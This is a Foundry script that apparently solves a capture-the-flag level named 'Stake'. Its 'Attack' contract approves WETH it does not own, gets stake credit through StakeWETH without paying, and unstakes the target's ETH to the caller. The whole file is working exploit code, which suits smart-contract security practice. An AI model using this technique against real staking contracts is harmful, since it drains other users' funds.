// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Stake} from "../src/31_Stake.sol";
import {Script, console} from "forge-std/Script.sol";

contract StakeSolve is Script {
    Stake stake = Stake(0xc6445764B78770056F2ae62FB7B24BFB19334f9f);
    address weth = stake.WETH();
    uint256 stakeAmount = 0.001 ether + 1 wei;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address inv1nc = vm.envAddress("MY_ADDRESS");

        stake.StakeETH{value: stakeAmount}();
        stake.Unstake(stakeAmount);

        new Attack().pwn{value: stakeAmount}();

        console.log("Contract Balance#", address(stake).balance);
        console.log("Total Staked#", stake.totalStaked());
        console.log("Am I Staker?", stake.Stakers(inv1nc));
        console.log("My Stake Balance#", stake.UserStake(inv1nc));
        vm.stopBroadcast();
    }
}

contract Attack {
    Stake stake = Stake(0xc6445764B78770056F2ae62FB7B24BFB19334f9f);
    address weth = stake.WETH();
    address owner;

    function pwn() external payable {
        owner = msg.sender;
        (bool success,) = weth.call(abi.encodeWithSelector(0x095ea7b3, address(stake), 1 ether));
        require(success);
        stake.StakeWETH(1 ether);
        stake.StakeETH{value: msg.value}();
        stake.Unstake(address(stake).balance - 1 wei);
    }

    fallback() external payable {
        (bool success,) = address(owner).call{value: msg.value}("");
        require(success);
    }
}
